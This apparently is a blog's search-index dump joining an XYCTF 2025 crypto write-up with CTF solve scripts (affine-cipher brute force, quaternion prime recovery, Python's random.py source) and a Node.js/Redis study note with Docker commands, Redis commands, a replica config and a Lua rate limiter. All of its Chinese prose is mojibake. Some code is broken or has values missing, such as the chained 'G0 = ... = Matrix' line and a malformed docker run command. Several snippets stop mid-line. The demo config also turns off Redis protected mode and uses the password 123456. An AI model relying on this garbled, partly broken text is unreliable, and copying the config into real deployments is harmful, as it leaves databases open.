prng.round(r.randrange(2**16)) b = prng.round(r.randrange(2**16)) enc = encrypt(flag, a, b) print(enc) è¾“å…¥seedï¼Œç„¶åäº§ç”Ÿ$a*x+b \\bmod p$ï¼Œèµ›åå¬åˆ«çš„å¸ˆå‚…è¯´ç±»ä¼¼lcgï¼Œå¯ä»¥é€šè¿‡å¾ªç¯å»é™å®šabçš„èŒƒå›´ï¼Œç„¶åæ’åˆ—ç»„åˆçˆ†ç ´å‡ºæ¥ï¼Œå•§ï¼Œæ²¡æƒ³åˆ°ï¼Œä½†æ˜¯ç›´æ¥æš´åŠ›åŒ¹é…ä¹Ÿå¯ä»¥ exp.py from string import ascii_letters, digits import re from typing import List, Tuple, Optional, Set CHAR_TABLE = ascii_letters + digits MOD = 19198111 ENC = [] def extended_gcd(a: int, b: int) -\u003e Tuple[int, int, int]: if a == 0: return b, 0, 1 g, y, x = extended_gcd(b % a, a) return g, x - (b // a) * y, y def modinv(a: int, m: int) -\u003e Optional[int]: g, x, _ = extended_gcd(a, m) return x % m if g == 1 else None def is_readable(s: str) -\u003e bool: return bool(re.search(r'[A-Za-z]{2,}', s)) and len(re.findall(r'\\d', s)) \u003c 5 def solve() -\u003e List[str]: candidates: Set[str] = set() processed: Set[Tuple[int, int]] = set() table_len = len(CHAR_TABLE) cipher_pairs = [(i, j) for i in range(len(ENC)) for j in range(i + 1, len(ENC)) if ENC[i] != ENC[j]] for idx1, idx2 in cipher_pairs: c1, c2 = ENC[idx1], ENC[idx2] delta_c = (c1 - c2) % MOD for i1 in range(table_len): p1 = ord(CHAR_TABLE[i1]) for i2 in range(table_len): if i1 == i2: continue p2 = ord(CHAR_TABLE[i2]) delta_i = (p1 - p2) % MOD inv = modinv(delta_i, MOD) if inv is None: continue a = (delta_c * inv) % MOD b = (c1 - a * p1) % MOD if (a, b) in processed: continue processed.add((a, b)) a_inv = modinv(a, MOD) if a_inv is None: continue flag = [] for c in ENC: i = ((c - b) * a_inv) % MOD if not (0 \u003c= i \u003c table_len): break flag.append(CHAR_TABLE[i]) else: candidate = ''.join(flag) if len(candidate) == len(ENC): candidates.add(candidate) readable = [f for f in candidates if is_readable(f)] return readable if readable else list(candidates) def main(): results = solve() print(f\"Found {len(results)} possible candidates:\") for idx, flag in enumerate(results, 1): print(f\"#{idx}: XYCTF{{{flag}}}\") if __name__ == \"__main__\": main() ","date":"2025-04-07","objectID":"/xyctf2025/:2:4","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"å¤å¤å¤æ•° task.py class ComComplex: def __init__(self, value=[0,0,0,0]): self.value = value def __str__(self): s = str(self.value[0]) for k,i in enumerate(self.value[1:]): if i \u003e= 0: s += '+' s += str(i) +'ijk'[k] return s def __add__(self,x): return ComComplex([i+j for i,j in zip(self.value,x.value)]) def __mul__(self,x): a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3] b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2] c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1] d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0] return ComComplex([a,b,c,d]) def __mod__(self,x): return ComComplex([i % x for i in self.value]) def __pow__(self, x, n=None): tmp = ComComplex(self.value) a = ComComplex([1,0,0,0]) while x: if x \u0026 1: a *= tmp tmp *= tmp if n: a %= n tmp %= n x \u003e\u003e= 1 return a from Crypto.Util.number import * from secret import flag, hint p = getPrime(256) q = getPrime(256) r = getPrime(256) n = p * q * r P = getPrime(512) assert len(hint) == 20 hints = ComComplex([bytes_to_long(hint[i:i+5]) for i in range(0,20,5)]) keys = ComComplex([0, p, q, r]) print('hint =',hints) print('gift =',hints*keys%P) print('P =',P) e = 65547 m = ComComplex([bytes_to_long(flag[i:i+len(flag)//4+1]) for i in range(0,len(flag),len(flag)//4+1)]) c = pow(m, e, n) print('n =', n) print('c =', c) æ„Ÿè§‰aiæ¯”æˆ‘æ‡‚ï¼Œä¼˜å…ˆå»å›å¤pqrï¼Œä»£ç å®šä¹‰çš„ä¹˜æ³•å°±æ˜¯å››å…ƒæ•°ï¼Œé‚£ä¹ˆå°±æ˜¯ä¸‰ä¸ªçº¿æ€§åŒä½™å¼ï¼Œå¯ä»¥ç›´æ¥å»æ±‚è§£ï¼Œè®©aiå¸®æˆ‘æ“ä¸ªä»£ç  from Crypto.Util.number import long_to_bytes, inverse, bytes_to_long, getPrime from sympy import Matrix import sys class ComComplex: def __init__(self, value=[0,0,0,0]): self.value = value def __str__(self): s = str(self.value[0]) for k,i in enumerate(self.value[1:]): if i \u003e= 0: s += '+' s += str(i) +'ijk'[k] return s def __add__(self,x): return ComComplex([i+j for i,j in zip(self.value,x.value)]) def __mul__(self,x): a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3] b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2] c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1] d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0] return ComComplex([a,b,c,d]) def __mod__(self,x): return ComComplex([i % x for i in self.value]) def __pow__(self, x, n=None): tmp = ComComplex(self.value) a = ComComplex([1,0,0,0]) while x: if x \u0026 1: a *= tmp tmp *= tmp if n: a %= n tmp %= n x \u003e\u003e= 1 return a A = 375413371936 B = 452903063925 C = 418564633198 D = 452841062207 G0 = G1 = G2 = G3 = P = M = Matrix([ [-B, -C, -D], [ A, -D, C], [ D, A, -B] ]) v = Matrix([G0 % P, G1 % P, G2 % P]) M_inv = M.inv_mod(P) solution = M_inv * v p1 = int(solution[0] % P) q1 = int(solution[1] % P) r1 = int(solution[2] % P) print(p1,q1,r1) ç„¶åæœ¬æ¥æƒ³ç›´æ¥æ±‚flagï¼Œå‘ç°e=65547ï¼Œä¸äº’ç´ ï¼Œæ‹¿ä¸ªä»¥å‰çš„crtç›´æ¥ç”¨å°±è¡Œäº† from Crypto.Util.number import * from Crypto.Util.number import GCD as gcd class ComComplex: def __init__(self, value=[0,0,0,0]): self.value = value def __str__(self): s = str(self.value[0]) for k,i in enumerate(self.value[1:]): if i \u003e= 0: s += '+' s += str(i) +'ijk'[k] return s def __add__(self,x): return ComComplex([i+j for i,j in zip(self.value,x.value)]) def __mul__(self,x): a = self.value[0]*x.value[0]-self.value[1]*x.value[1]-self.value[2]*x.value[2]-self.value[3]*x.value[3] b = self.value[0]*x.value[1]+self.value[1]*x.value[0]+self.value[2]*x.value[3]-self.value[3]*x.value[2] c = self.value[0]*x.value[2]-self.value[1]*x.value[3]+self.value[2]*x.value[0]+self.value[3]*x.value[1] d = self.value[0]*x.value[3]+self.value[1]*x.value[2]-self.value[2]*x.value[1]+self.value[3]*x.value[0] return ComComplex([a,b,c,d]) def __mod__(self,x): return ComComplex([i % x for i in self.value]) def __pow__(self, x, n=None): tmp = ComComplex(self.value) a = ComComplex([1,0,0,0]) wh","date":"2025-04-07","objectID":"/xyctf2025/:2:5","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"choice choice.py from Crypto.Util.number import bytes_to_long from random import Random from secret import flag assert flag.startswith(b'XYCTF{') and flag.endswith(b'}') flag = flag[6:-1] msg = bytes_to_long(flag) rand = Random() test = bytes([i for i in range(255, -1, -1)]) open('output.py', 'w').write(f'enc = {msg ^ rand.getrandbits(msg.bit_length())}\\nr = {[rand.choice(test) for _ in range(2496)]}') random.py \"\"\"Random variable generators. bytes ----- uniform bytes (values between 0 and 255) integers -------- uniform within range sequences --------- pick random element pick random sample pick weighted random sample generate random permutation distributions on the real line: ------------------------------ uniform triangular normal (Gaussian) lognormal negative exponential gamma beta pareto Weibull distributions on the circle (angles 0 to 2pi) --------------------------------------------- circular uniform von Mises discrete distributions ---------------------- binomial General notes on the underlying Mersenne Twister core generator: * The period is 2**19937-1. * It is one of the most extensively tested generators in existence. * The random() method is implemented in C, executes in a single Python step, and is, therefore, threadsafe. \"\"\" # Translated by Guido van Rossum from C source provided by # Adrian Baddeley. Adapted by Raymond Hettinger for use with # the Mersenne Twister and os.urandom() core generators. from warnings import warn as _warn from math import log as _log, exp as _exp, pi as _pi, e as _e, ceil as _ceil from math import sqrt as _sqrt, acos as _acos, cos as _cos, sin as _sin from math import tau as TWOPI, floor as _floor, isfinite as _isfinite from math import lgamma as _lgamma, fabs as _fabs, log2 as _log2 from os import urandom as _urandom from _collections_abc import Sequence as _Sequence from operator import index as _index from itertools import accumulate as _accumulate, repeat as _repeat from bisect import bisect as _bisect import os as _os import _random try: # hashlib is pretty heavy to load, try lean internal module first from _sha2 import sha512 as _sha512 except ImportError: # fallback to official implementation from hashlib import sha512 as _sha512 __all__ = [ \"Random\", \"SystemRandom\", \"betavariate\", \"binomialvariate\", \"choice\", \"choices\", \"expovariate\", \"gammavariate\", \"gauss\", \"getrandbits\", \"getstate\", \"lognormvariate\", \"normalvariate\", \"paretovariate\", \"randbytes\", \"randint\", \"random\", \"randrange\", \"sample\", \"seed\", \"setstate\", \"shuffle\", \"triangular\", \"uniform\", \"vonmisesvariate\", \"weibullvariate\", ] NV_MAGICCONST = 4 * _exp(-0.5) / _sqrt(2.0) LOG4 = _log(4.0) SG_MAGICCONST = 1.0 + _log(4.5) BPF = 53 # Number of bits in a float RECIP_BPF = 2 ** -BPF _ONE = 1 class Random(_random.Random): \"\"\"Random number generator base class used by bound module functions. Used to instantiate instances of Random to get generators that don't share state. Class Random can also be subclassed if you want to use a different basic generator of your own devising: in that case, override the following methods: random(), seed(), getstate(), and setstate(). Optionally, implement a getrandbits() method so that randrange() can cover arbitrarily large ranges. \"\"\" VERSION = 3 # used by getstate/setstate def __init__(self, x=None): \"\"\"Initialize an instance. Optional argument x controls seeding, as for Random.seed(). \"\"\" self.seed(x) self.gauss_next = None def seed(self, a=None, version=2): \"\"\"Initialize internal state from a seed. The only supported seed types are None, int, float, str, bytes, and bytearray. None or no argument seeds from current time or from an operating system specific randomness source if available. If *a* is an int, all bits are used. For version 2 (the default), all of the bits are used if *a* is a str, bytes, or bytearray. For version 1 (provided for reproducing random sequences from older versions of Python), the algorithm for str and bytes generates a narrower range of seeds. \"\"\" if version == 1 and ","date":"2025-04-07","objectID":"/xyctf2025/:2:6","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"prng_xxxx ç­‰å®˜æ–¹wpå§ ","date":"2025-04-07","objectID":"/xyctf2025/:2:7","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["CTF"],"content":"æ€»ç»“ è´¨é‡çœŸçš„æŒºé«˜çš„ï¼Œä¸æ„§æ˜¯å¤§æ¶äººå‡ºçš„é¢˜(ï¼Œä½†æ˜¯é˜Ÿå‹çš„å‘æŒ¥ï¼Œå®³ï¼Œç®—äº†ï¼Œåæ§½åˆ°ä¸æƒ³åæ§½äº† ","date":"2025-04-07","objectID":"/xyctf2025/:3:0","tags":["crypto"],"title":"Xyctf2025","uri":"/xyctf2025/"},{"categories":["nodejs"],"content":"Redis ","date":"2025-04-06","objectID":"/study_nodejs4/:1:0","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"dockeréƒ¨ç½² æœ¬åœ°æ˜¯macï¼ŒåŠ ä¸Šåˆå­¦ä¸æƒ³æ±¡æŸ“ç¯å¢ƒï¼Œå°±ç”¨dockerè¯•è¯• docker pull redis docker run -p 6379:6379 -d - redis-server --appendonly yes docker rename funny_buck redis docker exec -it redis redis-cli //vscä¸­Database Clientå¯ä»¥å¯è§†åŒ– ","date":"2025-04-06","objectID":"/study_nodejs4/:1:1","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"å­—ç¬¦ä¸²å‘½ä»¤ SET key value [NX|XX] [EX seconds] [PX milliseconds] [GET] keyï¼šè¦è®¾ç½®çš„é”®åã€‚ valueï¼šè¦è®¾ç½®çš„å€¼ã€‚ NXï¼šå¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºåªåœ¨é”®ä¸å­˜åœ¨æ—¶æ‰è®¾ç½®å€¼ã€‚ XXï¼šå¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºåªåœ¨é”®å·²ç»å­˜åœ¨æ—¶æ‰è®¾ç½®å€¼ã€‚ EX secondsï¼šå¯é€‰å‚æ•°ï¼Œå°†é”®çš„è¿‡æœŸæ—¶é—´è®¾ç½®ä¸ºæŒ‡å®šçš„ç§’æ•°ã€‚ PX millisecondsï¼šå¯é€‰å‚æ•°ï¼Œå°†é”®çš„è¿‡æœŸæ—¶é—´è®¾ç½®ä¸ºæŒ‡å®šçš„æ¯«ç§’æ•°ã€‚ GETï¼šå¯é€‰å‚æ•°ï¼Œè¿”å›é”®çš„æ—§å€¼ã€‚ æ¯”å¦‚ SET name zsm NX EX 60 å°±æ˜¯åœ¨é”®ånameä¸å­˜åœ¨æ—¶ï¼Œè®¾ç½®é”®åä¸ºnameçš„å€¼ä¸ºzsmï¼Œå¹¶ä¸”è®¾ç½®é”®åçš„è¿‡æœŸæ—¶é—´ä¸º60ç§’ã€‚ SET score 5 XX åœ¨é”®åscoreå·²ç»å­˜åœ¨æ—¶ï¼Œè®¾ç½®é”®åä¸ºscoreçš„å€¼ä¸º5ã€‚ DEL name åˆ é™¤é”®åä¸ºnameçš„é”®å€¼å¯¹ã€‚ ","date":"2025-04-06","objectID":"/study_nodejs4/:1:2","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"é›†åˆå‘½ä»¤ SADD fruits \"apple\" SADD fruits \"banana\" SADD fruits \"orange\" SADDå‘½ä»¤ç”¨äºå‘é›†åˆä¸­æ·»åŠ å…ƒç´ ã€‚ SADDå‘½ä»¤çš„è¯­æ³•ä¸ºï¼šSADD key member [member ...]ï¼Œå…¶ä¸­keyä¸ºé›†åˆçš„åç§°ï¼Œmemberä¸ºè¦æ·»åŠ çš„å…ƒç´ ã€‚ SMEMBERS fruits SMEMBERSå‘½ä»¤ç”¨äºè·å–é›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚ SISMEMBER fruits \"apple\" SISMEMBERå‘½ä»¤ç”¨äºåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨é›†åˆä¸­ã€‚ SREM fruits \"banana\" SREMå‘½ä»¤ç”¨äºä»é›†åˆä¸­åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ã€‚ SCARD fruits SCARDå‘½ä»¤ç”¨äºè·å–é›†åˆä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚ SRANDMEMBER fruits SRANDMEMBERå‘½ä»¤ç”¨äºä»é›†åˆä¸­éšæœºè·å–ä¸€ä¸ªå…ƒç´ ã€‚ SUNION fruits vegetables SUNIONå‘½ä»¤ç”¨äºå°†å¤šä¸ªé›†åˆè¿›è¡Œå¹¶é›†æ“ä½œã€‚ SINTER fruits vegetables SINTERå‘½ä»¤ç”¨äºå°†å¤šä¸ªé›†åˆè¿›è¡Œäº¤é›†æ“ä½œã€‚ SDIFF fruits vegetables SDIFFå‘½ä»¤ç”¨äºå°†å¤šä¸ªé›†åˆè¿›è¡Œå·®é›†æ“ä½œã€‚ ","date":"2025-04-06","objectID":"/study_nodejs4/:1:3","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"å“ˆå¸Œè¡¨å‘½ä»¤ HSET obj name \"John\" HSET obj age 25 HSET obj email \"john@example.com\" HSETå‘½ä»¤ç”¨äºå‘å“ˆå¸Œè¡¨ä¸­æ·»åŠ é”®å€¼å¯¹ã€‚ HSETå‘½ä»¤çš„è¯­æ³•ä¸ºï¼šHSET key field value [field value ...]ï¼Œå…¶ä¸­keyä¸ºå“ˆå¸Œè¡¨çš„åç§°ï¼Œfieldä¸ºé”®åï¼Œvalueä¸ºé”®å€¼ã€‚ HGET obj name HGETå‘½ä»¤ç”¨äºè·å–å“ˆå¸Œè¡¨ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ HMSET obj name \"John\" age 25 email \"john@example.com\" HMSETå‘½ä»¤ç”¨äºå‘å“ˆå¸Œè¡¨ä¸­æ·»åŠ å¤šä¸ªé”®å€¼å¯¹ã€‚ HMGET obj name age email HMGETå‘½ä»¤ç”¨äºè·å–å“ˆå¸Œè¡¨ä¸­æŒ‡å®šé”®çš„å€¼ã€‚ HGETALL obj HGETALLå‘½ä»¤ç”¨äºè·å–å“ˆå¸Œè¡¨ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹ã€‚ HDEL obj age email HDELå‘½ä»¤ç”¨äºåˆ é™¤å“ˆå¸Œè¡¨ä¸­çš„æŒ‡å®šé”®ã€‚ HEXISTS obj name HEXISTSå‘½ä»¤ç”¨äºåˆ¤æ–­å“ˆå¸Œè¡¨ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šé”®ã€‚ HKEYS obj HKEYSå‘½ä»¤ç”¨äºè·å–å“ˆå¸Œè¡¨ä¸­çš„æ‰€æœ‰é”®ã€‚ HVALS obj HVALSå‘½ä»¤ç”¨äºè·å–å“ˆå¸Œè¡¨ä¸­çš„æ‰€æœ‰å€¼ã€‚ HLEN obj HLENå‘½ä»¤ç”¨äºè·å–å“ˆå¸Œè¡¨ä¸­çš„é”®å€¼å¯¹ä¸ªæ•°ã€‚ ","date":"2025-04-06","objectID":"/study_nodejs4/:1:4","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"åˆ—è¡¨å‘½ä»¤ RPUSH key element1 element2 element3 LPUSH key element1 element2 element3 RPUSHå‘½ä»¤ç”¨äºå°†å…ƒç´ ä»å³ä¾§æ’å…¥åˆ—è¡¨ã€‚ LPUSHå‘½ä»¤ç”¨äºå°†å…ƒç´ ä»å·¦ä¾§æ’å…¥åˆ—è¡¨ã€‚ RPUSH\u0026LPUSHå‘½ä»¤çš„è¯­æ³•ä¸ºï¼šRPUSH key element [element ...]ï¼Œå…¶ä¸­keyä¸ºåˆ—è¡¨çš„åç§°ï¼Œelementä¸ºè¦æ’å…¥çš„å…ƒç´ ã€‚ LINDEX key index LRANGE key start stop LINDEXå‘½ä»¤ç”¨äºè·å–åˆ—è¡¨ä¸­æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ ã€‚ LRANGEå‘½ä»¤ç”¨äºè·å–åˆ—è¡¨ä¸­æŒ‡å®šèŒƒå›´å†…çš„å…ƒç´ ã€‚ LSET key index newValue LSETå‘½ä»¤ç”¨äºä¿®æ”¹åˆ—è¡¨ä¸­æŒ‡å®šç´¢å¼•ä½ç½®çš„å…ƒç´ çš„å€¼ã€‚ LPOP key RPOP key LREM key count value LPOPå‘½ä»¤ç”¨äºä»åˆ—è¡¨çš„å·¦ä¾§ç§»é™¤å¹¶è¿”å›ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ RPOPå‘½ä»¤ç”¨äºä»åˆ—è¡¨çš„å³ä¾§ç§»é™¤å¹¶è¿”å›æœ€åä¸€ä¸ªå…ƒç´ ã€‚ LREMå‘½ä»¤ç”¨äºä»åˆ—è¡¨ä¸­åˆ é™¤æŒ‡å®šæ•°é‡çš„æŒ‡å®šå€¼å…ƒç´ ã€‚ LLEN key LLENå‘½ä»¤ç”¨äºè·å–åˆ—è¡¨çš„é•¿åº¦ã€‚ ","date":"2025-04-06","objectID":"/study_nodejs4/:1:5","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"æŒä¹…åŒ– RDBï¼ˆRedis Databaseï¼‰æŒä¹…åŒ–ï¼šRDBæ˜¯ä¸€ç§å¿«ç…§çš„å½¢å¼ï¼Œå®ƒä¼šå°†å†…å­˜ä¸­çš„æ•°æ®å®šæœŸä¿å­˜åˆ°ç£ç›˜ä¸Šã€‚å¯ä»¥é€šè¿‡é…ç½®RedisæœåŠ¡å™¨ï¼Œè®¾ç½®è‡ªåŠ¨è§¦å‘RDBå¿«ç…§çš„æ¡ä»¶ï¼Œæ¯”å¦‚åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…ï¼Œæˆ–è€…åœ¨æŒ‡å®šçš„å†™æ“ä½œæ¬¡æ•°è¾¾åˆ°ä¸€å®šé˜ˆå€¼æ—¶è¿›è¡Œå¿«ç…§ä¿å­˜ã€‚RDBæŒä¹…åŒ–ç”Ÿæˆçš„å¿«ç…§æ–‡ä»¶æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒ…å«äº†Redisæ•°æ®çš„å®Œæ•´çŠ¶æ€ã€‚åœ¨æ¢å¤æ•°æ®æ—¶ï¼Œå¯ä»¥é€šè¿‡åŠ è½½å¿«ç…§æ–‡ä»¶å°†æ•°æ®é‡æ–°åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ AOFï¼ˆAppend-Only Fileï¼‰æŒä¹…åŒ–ï¼šAOFæŒä¹…åŒ–è®°å½•äº†RedisæœåŠ¡å™¨æ‰§è¡Œçš„æ‰€æœ‰å†™æ“ä½œå‘½ä»¤ï¼Œåœ¨æ–‡ä»¶ä¸­ä»¥è¿½åŠ çš„æ–¹å¼ä¿å­˜ã€‚å½“Rediséœ€è¦é‡å¯æ—¶ï¼Œå¯ä»¥é‡æ–°æ‰§è¡ŒAOFæ–‡ä»¶ä¸­ä¿å­˜çš„å‘½ä»¤ï¼Œä»¥é‡æ–°æ„å»ºæ•°æ®é›†ã€‚ç›¸æ¯”äºRDBæŒä¹…åŒ–ï¼ŒAOFæŒä¹…åŒ–æä¾›äº†æ›´å¥½çš„æ•°æ®æ¢å¤ä¿è¯ï¼Œå› ä¸ºå®ƒè®°å½•äº†æ¯ä¸ªå†™æ“ä½œï¼Œè€Œä¸æ˜¯å¿«ç…§çš„å½¢å¼ã€‚ç„¶è€Œï¼ŒAOFæ–‡ä»¶ç›¸å¯¹äºRDBæ–‡ä»¶æ›´å¤§ï¼Œæ¢å¤æ•°æ®çš„é€Ÿåº¦å¯èƒ½ä¼šæ¯”è¾ƒæ…¢ã€‚ å¯åŠ¨dockerçš„æ—¶å€™- redis-server â€“appendonly yeså°±æ˜¯æ‰“å¼€äº†rdb docker exec -it redis bash root@4f92f5f4b595:/data# ls appendonlydir dump.rdb å¦‚æœæƒ³é€šè¿‡é…ç½®æ–‡ä»¶ä¿®æ”¹ï¼Œå¯ä»¥é€šè¿‡ä¸‹è½½taråŒ…æˆ–è€…æ˜¯ç¼–å†™dockerfile ","date":"2025-04-06","objectID":"/study_nodejs4/:1:6","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"è®¢é˜…\u0026äº‹åŠ¡ è®¢é˜… ç›‘å¬å‘½ä»¤ subscribe æ¨é€å‘½ä»¤ publish æ•´ä½“æ•ˆæœ 127.0.0.1:6379\u003e subscribe zsm 1) \"subscribe\" 2) \"zsm\" 3) (integer) 1 1) \"message\" 2) \"zsm\" 3) \"200\" 127.0.0.1:6379\u003e publish zsm 200 (integer) 1 å…¶å®å°±æ˜¯rediså¤šä¸ªå®ä¾‹ä¹‹é—´è¿›è¡Œé€šè®¯ï¼Œä½†æ˜¯ä¸èƒ½æŒä¹…åŒ– äº‹åŠ¡ ä¸èƒ½å›æ»šï¼Œä¿è¯åŸå­çš„ä¸€è‡´æ€§ æ‰“å¼€ multi å…³é—­ discard 127.0.0.1:6379\u003e set A 100 OK 127.0.0.1:6379\u003e set B 100 OK 127.0.0.1:6379\u003e multi OK 127.0.0.1:6379(TX)\u003e set A 0 QUEUED 127.0.0.1:6379(TX)\u003e set B 200 QUEUED 127.0.0.1:6379(TX)\u003e exec 1) OK 2) OK æœ‰ç‚¹ç±»ä¼¼äºé˜Ÿåˆ—ï¼Œå¯ä»¥å†™å…¥ä¸€å †ä¸œè¥¿ï¼Œç„¶åä¸€å—æ‰§è¡Œï¼Œé‚£å¦‚æœå¯ä»¥å®šæ—¶ï¼Œå°±æ˜¯ç†æƒ³çš„ä½¿ç”¨æ–¹æ³•äº† ","date":"2025-04-06","objectID":"/study_nodejs4/:1:7","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"ä¸»ä»å¤åˆ¶ dockerå®ç°ä¹Ÿä¸ç®—éº»çƒ¦ ä¸» mkdir -p /home/docker/redis6379/conf mkdir -p /home/docker/redis6379/data vi /home/docker/redis6379/conf/redis.conf # æœåŠ¡ç«¯å£ é»˜è®¤6379 port 6379 # å…³é—­ä¿æŠ¤æ¨¡å¼ï¼Œå…è®¸è¿œç¨‹è¿æ¥ protected-mode no # å¯†ç  requirepass 123456 ä» mkdir -p /home/docker/redis6380/conf mkdir -p /home/docker/redis6380/data vi /home/docker/redis6380/conf/redis.conf # æœåŠ¡ç«¯å£ é»˜è®¤6379 port 6380 # å…³é—­ä¿æŠ¤æ¨¡å¼ï¼Œå…è®¸è¿œç¨‹è¿æ¥ protected-mode no # å¯†ç  requirepass 123456 # ä¸»èŠ‚ç‚¹å¯†ç  masterauth 123456 # ä¸»ä»å¤åˆ¶ replicaof 172.16.8.186 6379 å¯åŠ¨ ä¸» docker run -d \\ -p 6379:6379 \\ --name redis6379 \\ --restart always \\ --privileged=true \\ -v /home/docker/redis6379/conf/redis.conf:/etc/redis/redis.conf \\ -v /home/docker/redis6379/data:/data \\ redis:latest \\ redis-server /etc/redis/redis.conf ä» docker run -d \\ -p 6381:6381 \\ --name redis6381 \\ --restart always \\ --privileged=true \\ -v /home/docker/redis6381/conf/redis.conf:/etc/redis/redis.conf \\ -v /home/docker/redis6381/data:/data \\ redis:latest \\ redis-server /etc/redis/redis.conf ","date":"2025-04-06","objectID":"/study_nodejs4/:1:8","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"redis\u0026nodejsè”åŠ¨ npm i ioredis import Redis from \"ioredis\"; //å‘½ä»¤è¡Œ=\u003eé¢å‘å¯¹è±¡ const redis = new Redis({ host: \"127.0.0.1\", port: 6379, }) // redis.set(\"name\", \"zhangsan\") // redis.get(\"name\").then((res) =\u003e { // console.log(res) // }) //redis.setex(\"age\",5, 18)//è®¾ç½®è¿‡æœŸæ—¶é—´ //redis.sadd(\"set\", \"a\", \"b\", \"c\") // redis.smembers(\"set\").then((res) =\u003e { // console.log(res) // }) // redis.srem(\"set\", \"a\", \"b\", \"c\") // redis.hset(\"hash\", \"name\", \"zhangsan\", \"age\", 18) //redis.hdel(\"hash\", \"name\") redis.hgetall(\"hash\").then((res) =\u003e { console.log(res) }) å’Œæ•°æ®åº“çš„prismaé‚£è¾¹ä¸ä¸€æ ·ï¼Œè¿™è¾¹æ„Ÿè§‰å°±æ˜¯å§å‘½ä»¤ç›´æ¥å˜æˆä»£ç äº† ","date":"2025-04-06","objectID":"/study_nodejs4/:1:9","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"lua\u0026redis\u0026nodejs å®ç°ä¸€ä¸ªç®€å•çš„é™æµé˜€ï¼Œå°±æ˜¯æ¯”å¦‚è…¾è®¯æ¸¸æˆæŠ½å¥–æ¯æ¬¡åªèƒ½åœ¨æœ‰é™æ—¶é—´ç‚¹æœ‰é™æ¬¡æ•°çš„é‚£ç§ index.html \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"btn\"\u003eæŠ½å¥–\u003c/button\u003e \u003cscript\u003e const btn = document.getElementById('btn'); btn.onclick = function () { fetch('http://localhost:3000/lottery').then(res =\u003e { return res.text() }).then(data =\u003e { console.log(data) alert(data) }) } \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e index.js import express from 'express'; import Redis from 'ioredis'; import fs from 'node:fs'; const lua = fs.readFileSync('./index.lua', 'utf-8'); const redis = new Redis(); const app = express(); //é™æµé˜€ const KEY = 'lottery'; const TIME = 30 const LIMIT = 5 // è®¾ç½® CORS app.all('*', (req, res, next) =\u003e { res.header('Access-Control-Allow-Origin', '*'); res.header('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS'); res.header('Access-Control-Allow-Headers', 'Content-Type'); next(); }); app.get('/lottery', (req, res) =\u003e { redis.eval(lua, 1, KEY, TIME, LIMIT, (err, result) =\u003e { if (err) { console.log(err) return res.status(500).json({ error: err.message }); } if (result == 1) { res.send('æŠ½å¥–æˆåŠŸ') } else { res.send('è¯·ç¨åå†è¯•') } }) }) app.listen(3000, () =\u003e { console.log('Server is running on port 3000'); }) index.lua local key = KEYS[1] local inerval = tonumber(ARGV[1]) local count = tonumber(ARGV[2]) local limit = tonumber(redis.call(\"get\", key) or \"0\") if limit + 1 \u003e= count then return 0 else 